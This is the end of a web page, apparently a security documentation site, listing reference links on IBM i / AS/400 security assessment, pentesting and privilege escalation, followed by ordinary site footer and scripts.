<li><a href="https://podalirius.net/en/mainframe/ibm-as-400-tcp-ip-configuration/">IBM AS/400 - Configuration TCP/IP - Podalirius - August 5, 2021</a></li>
<li><a href="https://silentsignal.hu/docs/S2-TROOPERS24-IBM_i_for_Wintel_Hackers.pdf">IBM I FOR WINTEL HACKERS - TROOPERS 2024 - ZOLTÁN PÁNCZÉL, BÁLINT VARGA-PERKE - June 26th, 2024</a></li>
<li><a href="https://info.townsendsecurity.com/ibm-i-privileged-users-a-unique-security-challenge">IBM i Privileged Users – A Unique Security Challenge - Patrick Townsend - June 27, 2017</a></li>
<li><a href="https://web.archive.org/web/20200704060220/https://blog.grimm-co.com/2020/06/ibm-i-security-demystified-blog-episode.html">IBM i Security Demystified Blog, Episode 1 - Matthew Carpenter - June 23, 2020</a></li>
<li><a href="https://podalirius.net/en/mainframe/ipl-modes-for-ibm-as400/">IPL types and modes for IBM AS/400 - Podalirius - June 16, 2021</a></li>
<li><a href="https://www.linkedin.com/pulse/your-ibm-i-iseriesas400-security-vulnerable-privilege-bob-losey/">Is Your IBM i (iSeries/AS400) Security Vulnerable To Privilege Escalation And Lack Of Proper Access Controls? - Bob Losey - June 6, 2022</a></li>
<li><a href="https://www.ossir.org/jssi/jssi2016/Pentest_AS400_COGICEO.pdf">Pentest AS/400 - COGICEO</a></li>
<li><a href="https://seclists.org/pen-test/2000/Dec/205">Re: [PEN-TEST] Pen-Testing AS/400 - Al Sparks - December 12, 2000</a></li>
<li><a href="https://podalirius.net/en/mainframe/restoring-an-ibm-as400-9401-150/">Restoring an IBM AS/400 (9401-150) - Podalirius - June 10, 2021</a></li>
<li><a href="https://web.archive.org/web/20200921183809/https://iisecurity.in/blog/security-assessment-ibm-400-system-part-1/">Security Assessment of the IBM i (AS 400) System – Part 1 - Shashank Gosavi - August 14, 2020</a></li>
<li><a href="https://web.archive.org/web/20200927010533/https://blog.securitybrigade.com/security-audit-of-ibm-as-400-system-i-part-1/">Security Audit of IBM AS/400 and System i : Part 1 - Yogesh Prasad - August 21, 2018</a></li>
<li><a href="https://web.archive.org/web/20200927002911/https://blog.securitybrigade.com/security-audit-ibm-as-400-system-i-2/">Security Audit of IBM AS/400 and System i : Part 2 - Yogesh Prasad - August 22, 2018</a></li>
<li><a href="https://blog.silentsignal.eu/2022/09/05/simple-ibm-i-as-400-hacking/">Simple IBM i (AS/400) hacking - Zoltán Pánczél - September 5, 2022</a></li>
<li><a href="https://www.ibm.com/docs/en/i/7.4?topic=fields-special-authority">Special authority - IBM - April 11, 2023</a></li>
<li><a href="https://www.securemyi.com/nl/articles/hijack.html">Stealing User Profiles! Exploiting Unsecured User Profiles on IBM i. - Dan Riehl - December 28, 2017</a></li>
<li><a href="https://www.ibm.com/support/pages/tcpip-ports-required-ibm-i-access-and-related-functions">TCP/IP Ports Required for IBM i Access and Related Functions - IBM - December 4, 2023</a></li>
<li><a href="https://www.youtube.com/watch?v=t4fUvfzgUbY">TROOPERS24: IBM i for Wintel Hackers - Bálint Varga-Perke, Zoltán Pánczél - Septemeber 2, 2024</a></li>
<li><a href="https://blog.silentsignal.eu/2025/01/21/ibm-acs-password-dump/">Vulnerability Archeology: Stealing Passwords with IBM i Access Client Solutions - Silent Signal - January 21, 2025</a></li>
<li><a href="https://podalirius.net/en/mainframe/why-building-an-os-400-lab-at-home-was-harder-than-i-expected/">Why Building an OS/400 Lab at Home Was Harder Than I Expected - Podalirius - January 24, 2020</a></li>
</ul>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="November 1, 2025 18:11:28 UTC">November 1, 2025</span>
  </span>

    
    
    
    
  </aside>





                
  <div class="social-container">
    <b>Share this content</b>
    <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
      <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
      <a class="a2a_button_x"></a>
      <a class="a2a_button_telegram"></a>
      <a class="a2a_button_linkedin"></a>
      <a class="a2a_button_email"></a>
      <a class="a2a_button_microsoft_teams"></a>
    </div>
    <br>
    <script async src="https://static.addtoany.com/menu/page.js"></script>
  </div>
  <script defer src="https://cloud.umami.is/script.js" data-website-id="49aad71c-7d98-4635-8bd5-b6799c8874f8"></script>

              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "content.action.edit", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
      
    
  </body>
</html>